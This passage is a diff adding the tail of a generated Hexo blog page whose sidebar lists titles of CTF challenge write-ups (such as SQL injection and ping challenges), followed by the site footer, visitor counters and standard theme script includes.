nav-level-2"><a class="nav-link" href="#极客大挑战-2019-PHP"><span class="nav-number">2.17.</span> <span class="nav-text">[极客大挑战 2019]PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-17"><span class="nav-number">2.17.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-number">2.18.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-18"><span class="nav-number">2.18.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">2.19.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-19"><span class="nav-number">2.19.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="nav-number">2.20.</span> <span class="nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-20"><span class="nav-number">2.20.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-number">2.21.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-21"><span class="nav-number">2.22.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">112.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
